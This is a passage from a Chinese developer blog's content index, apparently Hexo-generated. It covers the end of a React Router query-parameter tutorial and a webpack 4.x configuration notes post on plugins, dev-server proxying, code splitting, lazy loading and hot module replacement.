class="line">                &lt;/Switch&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/Router&gt;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Example;</span><br></pre></td></tr></table></figure>



<h5 id="7、Query-Parameters"><a href="#7、Query-Parameters" class="headerlink" title="7、Query Parameters"></a>7、Query Parameters</h5><p><code>QueryParameters.js</code></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  BrowserRouter <span class="keyword">as</span> Router,</span><br><span class="line">  Link,</span><br><span class="line">  useLocation</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> QueryParameters = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;Router&gt;</span><br><span class="line">      &lt;QueryParamsDemo /&gt;</span><br><span class="line">    &lt;/Router&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useQuery = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> URLSearchParams(useLocation().search);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> QueryParamsDemo = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> query = useQuery();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">          &lt;li&gt;</span><br><span class="line">            &lt;Link to=<span class="string">&quot;/account?name=张三&quot;</span>&gt;张三&lt;/Link&gt;</span><br><span class="line">          &lt;/li&gt;</span><br><span class="line">          &lt;li&gt;</span><br><span class="line">            &lt;Link to=<span class="string">&quot;/account?name=李四&quot;</span>&gt;李四&lt;/Link&gt;</span><br><span class="line">          &lt;/li&gt;</span><br><span class="line">          &lt;li&gt;</span><br><span class="line">            &lt;Link to=<span class="string">&quot;/account?name=王五&quot;</span>&gt;王五&lt;/Link&gt;</span><br><span class="line">          &lt;/li&gt;</span><br><span class="line">          &lt;li&gt;</span><br><span class="line">            &lt;Link to=<span class="string">&quot;/account?name=赵六&quot;</span>&gt;赵六&lt;/Link&gt;</span><br><span class="line">          &lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">        &lt;Child name=&#123;query.get(<span class="string">&quot;name&quot;</span>)&#125; /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Child = <span class="function">(<span class="params">&#123; name &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h3&gt;姓名：&#123;name&#125;&lt;/h3&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> QueryParameters;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="8、Hooks"><a href="#8、Hooks" class="headerlink" title="8、Hooks"></a>8、Hooks</h5><ul>
<li><a href="https://reactrouter.com/web/api/Hooks/usehistory">useHistory</a></li>
<li><a href="https://reactrouter.com/web/api/Hooks/uselocation">useLocation</a></li>
<li><a href="https://reactrouter.com/web/api/Hooks/useparams">useParams</a></li>
<li><a href="https://reactrouter.com/web/api/Hooks/useroutematch">useRouteMatch</a></li>
</ul>
]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react-router</tag>
      </tags>
  </entry>
  <entry>
    <title>webpack4.x笔记整理</title>
    <url>/20200913/121127.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。当 webpack 处理应用程序时，它会递归地构建一个依赖关系图(dependency graph)，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle</p>
</blockquote>
<a id="more"></a>

<h5 id="mode模式"><a href="#mode模式" class="headerlink" title="mode模式"></a>mode模式</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    mode:<span class="string">&#x27;development&#x27;</span> <span class="comment">//生产模式:production 开发模式:development</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="打包多页应用"><a href="#打包多页应用" class="headerlink" title="打包多页应用"></a>打包多页应用</h5><p>假如有两个入口文件，index.js和other.js,则需要如下配置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> HtmlWebpackPlugin=<span class="built_in">require</span>(<span class="string">&#x27;html-webpack-plugin&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> path=<span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    entry:&#123;</span><br><span class="line">        index:<span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">        other:<span class="string">&#x27;./src/other.js&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    output:&#123;</span><br><span class="line">        filename:<span class="string">&#x27;[name].bundle.js&#x27;</span>,</span><br><span class="line">        path:path.resolve(__dirname,<span class="string">&#x27;dist&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">            template:<span class="string">&#x27;./src/index.html&#x27;</span>,</span><br><span class="line">            chunks:<span class="string">&#x27;index&#x27;</span>, <span class="comment">//代码块</span></span><br><span class="line">            filename:<span class="string">&#x27;index.html&#x27;</span></span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">            template:<span class="string">&#x27;./src/other.html&#x27;</span>,</span><br><span class="line">            chunks:<span class="string">&#x27;other&#x27;</span>,</span><br><span class="line">            filename:<span class="string">&#x27;other.html&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="watch的用法"><a href="#watch的用法" class="headerlink" title="watch的用法"></a>watch的用法</h5><p>实时监控代码进行打包</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    watch:<span class="literal">true</span>,</span><br><span class="line">    watchOptions:&#123;</span><br><span class="line">        poll:<span class="number">1000</span> <span class="comment">//每秒询问1000次</span></span><br><span class="line">        aggregateTimeout:<span class="number">500</span>,<span class="comment">//防抖，一直输入代码</span></span><br><span class="line">        ignore:<span class="regexp">/node_modules/</span> <span class="comment">//不需要监控node_modules</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="webpack插件应用"><a href="#webpack插件应用" class="headerlink" title="webpack插件应用"></a>webpack插件应用</h5><h6 id="1-clean-webpack-plugin"><a href="#1-clean-webpack-plugin" class="headerlink" title="1.clean-webpack-plugin"></a>1.clean-webpack-plugin</h6><p>每次打包前先清空之前的打包文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; CleanWebpackPlugin &#125; = <span class="built_in">require</span>(<span class="string">&#x27;clean-webpack-plugin&#x27;</span>);</span><br><span class="line"><span class="built_in">module</span>.export=&#123;</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> CleanWebpackPlugin(<span class="string">&#x27;dist&#x27;</span>) <span class="comment">//参数可传数组，代表清除多个文件夹</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="2-copy-webpack-plugin"><a href="#2-copy-webpack-plugin" class="headerlink" title="2.copy-webpack-plugin"></a>2.copy-webpack-plugin</h6><p> 把文件夹拷贝到dist里面</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> CopyWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;copy-webpack-plugin&#x27;</span>);</span><br><span class="line"><span class="built_in">module</span>.export=&#123;</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> CopyWebpackPlugin([</span><br><span class="line">          &#123; <span class="attr">from</span>: <span class="string">&#x27;./doc&#x27;</span>, <span class="attr">to</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;,</span><br><span class="line">          &#123; <span class="attr">from</span>: <span class="string">&#x27;./other&#x27;</span>, <span class="attr">to</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;,</span><br><span class="line">        ])</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="3-banner-plugin"><a href="#3-banner-plugin" class="headerlink" title="3.banner-plugin"></a>3.banner-plugin</h6><p>版权声明插件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> webpack=<span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>);</span><br><span class="line"><span class="built_in">module</span>.export=&#123;</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> webpack.BannerPlugin(<span class="string">&#x27;make 2019 by jackeywei&#x27;</span>)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="使用CDN"><a href="#使用CDN" class="headerlink" title="使用CDN"></a>使用CDN</h5><p>模板html文件中使用了CDN</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--从CDN中引入jquery--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果在代码中引用了jquery,会再次打包jquery库</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> $ <span class="keyword">from</span> <span class="string">&#x27;jquery&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果不想这样，而是遇到引用jquery就默认使用cdn引用的jquery，就需要在webpack中如下配置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    externals:&#123;</span><br><span class="line">        jquery:<span class="string">&#x27;$&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="webpack跨域问题"><a href="#webpack跨域问题" class="headerlink" title="webpack跨域问题"></a>webpack跨域问题</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    devServer:&#123;</span><br><span class="line">        proxy:&#123;<span class="comment">//配置代理</span></span><br><span class="line">            <span class="string">&#x27;/api&#x27;</span>:&#123;</span><br><span class="line">                target:<span class="string">&#x27;http://localhost:8000&#x27;</span>,</span><br><span class="line">                changeOrigin:<span class="literal">true</span>,</span><br><span class="line">                pathRewrite:&#123;</span><br><span class="line">                    <span class="string">&#x27;^/api&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        before(app)&#123;</span><br><span class="line">            <span class="comment">//这里可以mock数据 app相当于 let app=express();</span></span><br><span class="line">            app.get(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">               res.send(<span class="string">&#x27;hello&#x27;</span>) </span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="resolve属性的配置"><a href="#resolve属性的配置" class="headerlink" title="resolve属性的配置"></a>resolve属性的配置</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    resolve:&#123;</span><br><span class="line">        <span class="comment">// 找的时候就找当前目录的node_modules就行了，不用向上查找了</span></span><br><span class="line">        modules:[path.resolve(<span class="string">&#x27;node_modules&#x27;</span>)],</span><br><span class="line">        <span class="comment">//配置别名，引用的时候就不用写那么长的名字了</span></span><br><span class="line">        alias:&#123;</span><br><span class="line">            <span class="string">&#x27;api&#x27;</span>:path.resolve(__dirname,<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;api&#x27;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//先找那个字段作为主入口</span></span><br><span class="line">        mainFileds:[<span class="string">&#x27;module&#x27;</span>,<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">        <span class="comment">//入口文件的名字</span></span><br><span class="line">        mainFiles:[<span class="string">&#x27;index.js&#x27;</span>],</span><br><span class="line">    	<span class="comment">//配置后缀名 配置后引用的时候不必要写后缀名   先找.js后缀，再到.css，再到.json</span></span><br><span class="line">    	extensions:[<span class="string">&#x27;.js&#x27;</span>,<span class="string">&#x27;.css&#x27;</span>,<span class="string">&#x27;json&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="定义环境变量"><a href="#定义环境变量" class="headerlink" title="定义环境变量"></a>定义环境变量</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> webpack=<span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>);</span><br><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">            <span class="string">&#x27;NODE_ENV&#x27;</span>:<span class="built_in">JSON</span>.stringify(<span class="string">&#x27;development&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="区分不同环境"><a href="#区分不同环境" class="headerlink" title="区分不同环境"></a>区分不同环境</h5><p>需要用到webpack-merge</p>
<p>webpack.config.js  基础配置文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    <span class="comment">//...基础的配置</span></span><br><span class="line">    <span class="built_in">module</span>:&#123;</span><br><span class="line">        rules:[]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>webpack.dev.js  开发环境配置文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;smart&#125;=<span class="built_in">require</span>(<span class="string">&#x27;webpack-merge&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> baseConfig=<span class="built_in">require</span>(<span class="string">&#x27;./webpack.config.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports=smart(baseConfig,&#123;</span><br><span class="line">    mode:<span class="string">&#x27;development&#x27;</span>,</span><br><span class="line">    <span class="comment">//开发环境的配置</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>webpack.prod.js 生产环境配置文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;smart&#125;=<span class="built_in">require</span>(<span class="string">&#x27;webpack-merge&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> baseConfig=<span class="built_in">require</span>(<span class="string">&#x27;./webpack.config.js&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports=smart(baseConfig,&#123;</span><br><span class="line">    mode:<span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">    <span class="comment">//开发环境的配置</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h5 id="配置source-map"><a href="#配置source-map" class="headerlink" title="配置source-map"></a>配置source-map</h5><p>调试代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * (1)source-map 源码映射文件，显示行与列，大而全</span></span><br><span class="line"><span class="comment">     * (2)eval-source-map 不会产生单独的文件，但是可以显示行和列</span></span><br><span class="line"><span class="comment">     * (3)cheap-module-source-map 不会产生列，但是是一个单独的映射文件</span></span><br><span class="line"><span class="comment">     * (4)cheap-module-eval-source-map 不会产生文件，集成在打包后的文件中，也不会产生列</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    devtool:<span class="string">&quot;source-map&quot;</span> <span class="comment">//增加映射文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="noParse"><a href="#noParse" class="headerlink" title="noParse"></a>noParse</h5><p>对于一些不依赖其他第三方库的工具库或者框架，例如jquery和lodash，可以使用noParse来阻止webpack来解析该库或框架中的依赖关系</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    <span class="built_in">module</span>:&#123;</span><br><span class="line">        noParse:<span class="regexp">/jquery|lodash/</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="exclude和include"><a href="#exclude和include" class="headerlink" title="exclude和include"></a>exclude和include</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    <span class="built_in">module</span>:&#123;</span><br><span class="line">        rules:[</span><br><span class="line">            &#123;</span><br><span class="line">                test:<span class="string">&#x27;\.js$&#x27;</span>,</span><br><span class="line">                <span class="comment">//排除</span></span><br><span class="line">                exclude:<span class="regexp">/node_modules/</span>,</span><br><span class="line">                <span class="comment">//包含</span></span><br><span class="line">                include:path.resolve(<span class="string">&#x27;src&#x27;</span>),</span><br><span class="line">                use:&#123;</span><br><span class="line">                    loader:<span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">                    options:&#123;</span><br><span class="line">                        presets:[</span><br><span class="line">                            <span class="string">&#x27;@babel/preset-env&#x27;</span></span><br><span class="line">                        ],</span><br><span class="line">                        plugins:[</span><br><span class="line">                            <span class="string">&#x27;@babel/plugin-transform-runtime&#x27;</span></span><br><span class="line">                        ]</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="IgnorePlugin"><a href="#IgnorePlugin" class="headerlink" title="IgnorePlugin"></a>IgnorePlugin</h5><p>moment.js里面引用了很多不需要的语言包，其实可以先用IgnorePlugin来忽略其中的引用，在需要引入的时候再引入</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> webpack=<span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> webpack.IgnorePlugin(<span class="regexp">/\.\/locale/</span>,<span class="regexp">/moment/</span>)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用moment</span></span><br><span class="line"><span class="keyword">import</span> moment <span class="keyword">from</span> <span class="string">&#x27;moment&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//手动引入所需要的语言</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;moment/locale/zh-cn&#x27;</span></span><br></pre></td></tr></table></figure>



<h5 id="DllPlugin"><a href="#DllPlugin" class="headerlink" title="DllPlugin"></a>DllPlugin</h5><p>动态链接库</p>
<p>webpack.dll.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> webapck=<span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>);</span><br><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    entry:&#123;</span><br><span class="line">        react:[<span class="string">&#x27;react&#x27;</span>,<span class="string">&#x27;react-dom&#x27;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    output:&#123;</span><br><span class="line">        filename:<span class="string">&#x27;[name].dll.js&#x27;</span>,</span><br><span class="line">        library:<span class="string">&#x27;[name]_dll&#x27;</span>,</span><br><span class="line">        path:path.resolve(__dirname,<span class="string">&#x27;dist&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> webpack.DllPlugin(&#123; <span class="comment">//name==library</span></span><br><span class="line">            name:<span class="string">&#x27;[name]_dll&#x27;</span>,</span><br><span class="line">            path:path.resolve(__dirname,<span class="string">&#x27;dist&#x27;</span>,<span class="string">&#x27;manifest.json&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>webpack.config.js</p>
<p>告诉webpack遇到引用react,react-dom的时候，不用重新打包，直接引用打包好的库就行了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> webpack.DllRefrencePlugin(&#123;</span><br><span class="line">            manifest:path.resolve(__dirname,<span class="string">&#x27;dist&#x27;</span>,<span class="string">&#x27;manifest.json&#x27;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;dllplugin&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&#x2F;&#x2F;引入打包好的库</span><br><span class="line">		&lt;script src&#x3D;&quot;&#x2F;react_dll.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>



<h5 id="happypack"><a href="#happypack" class="headerlink" title="happypack"></a>happypack</h5><p>多线程打包</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> HappyPack=<span class="built_in">require</span>(<span class="string">&#x27;happypack&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    <span class="built_in">module</span>:&#123;</span><br><span class="line">        rules:[</span><br><span class="line">            &#123;</span><br><span class="line">                test:<span class="regexp">/\.css$/</span>,</span><br><span class="line">                use:<span class="string">&#x27;HappyPack/loader?id=css&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">             	test:<span class="regexp">/\.js$/</span>,</span><br><span class="line">                use:<span class="string">&#x27;HappyPack/loader?id=js&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> HappyPack(&#123;</span><br><span class="line">            id:<span class="string">&#x27;css&#x27;</span>,</span><br><span class="line">            threads:<span class="number">6</span>,</span><br><span class="line">            use:[</span><br><span class="line">                <span class="string">&#x27;style-loader&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;css-loader&#x27;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="keyword">new</span> HappyPack(&#123;</span><br><span class="line">            id:<span class="string">&#x27;js&#x27;</span>,</span><br><span class="line">            threads:<span class="number">5</span>,</span><br><span class="line">            use:[&#123;</span><br><span class="line">                loader:<span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">                options:&#123;</span><br><span class="line">                    presets:[</span><br><span class="line">                        <span class="string">&#x27;@babel/preset-env&#x27;</span></span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="webpack自带优化"><a href="#webpack自带优化" class="headerlink" title="webpack自带优化"></a>webpack自带优化</h5><ul>
<li>tree-shaking     <strong>import 在生产环境下，会自动去除掉没用到的代码</strong></li>
<li>scope-hoisting    <strong>作用域提升</strong></li>
</ul>
<h5 id="抽离公共代码"><a href="#抽离公共代码" class="headerlink" title="抽离公共代码"></a>抽离公共代码</h5><p>多入口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    entry:&#123;</span><br><span class="line">        index:<span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">        other:<span class="string">&#x27;./src/other.js&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    output:&#123;</span><br><span class="line">        filename:<span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">        path:path.resolve(__dirname,<span class="string">&#x27;dist&#x27;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    optimization:&#123;<span class="comment">//优化项</span></span><br><span class="line">        splitChunks:&#123;<span class="comment">//分割代码块</span></span><br><span class="line">            cacheGroups:&#123;<span class="comment">//缓存组</span></span><br><span class="line">                common:&#123;<span class="comment">//公共的模块</span></span><br><span class="line">                    chunks:<span class="string">&#x27;initial&#x27;</span>,</span><br><span class="line">                    minSize:<span class="number">0</span>,</span><br><span class="line">                    minChunks:<span class="number">2</span></span><br><span class="line">                &#125;,</span><br><span class="line">                vendor:&#123;<span class="comment">//第三方库</span></span><br><span class="line">                    priority:<span class="number">10</span>,<span class="comment">//权重  这样设置会先抽离第三方模块再抽离公共代码</span></span><br><span class="line">                    test:<span class="regexp">/node_modules/</span>,</span><br><span class="line">                    chunks:<span class="string">&#x27;initial&#x27;</span>,</span><br><span class="line">                    minSize:<span class="number">0</span>,</span><br><span class="line">                    chunks:<span class="number">2</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="懒加载"><a href="#懒加载" class="headerlink" title="懒加载"></a>懒加载</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> button=<span class="built_in">document</span>.querySelector(<span class="string">&#x27;.btn&#x27;</span>);</span><br><span class="line">button.addEventListener(<span class="string">&#x27;click&#x27;</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//es6草案中的语法 jsonp实现动态加载文件</span></span><br><span class="line">    <span class="keyword">import</span>(<span class="string">&quot;./test.js&quot;</span>)</span><br><span class="line">    	.then(<span class="function"><span class="params">data</span>=&gt;</span>&#123;</span><br><span class="line">        	<span class="built_in">console</span>.log(data.default);</span><br><span class="line">    	&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<h5 id="热更新"><a href="#热更新" class="headerlink" title="热更新"></a>热更新</h5><p>以往的操作，每次更改页面都刷新整个页面，修改只更新某一个部分，就是热更新。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports=&#123;</span><br><span class="line">    devServer:&#123;</span><br><span class="line">        hot:<span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    plugins:[</span><br><span class="line">        <span class="keyword">new</span> webpack.NamedModulesPlugin(),<span class="comment">//打印更新的模块路径</span></span><br><span class="line">        <span class="keyword">new</span> webpack.HotModuleReplacementPlugin()<span class="comment">//热更新插件</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中</p>
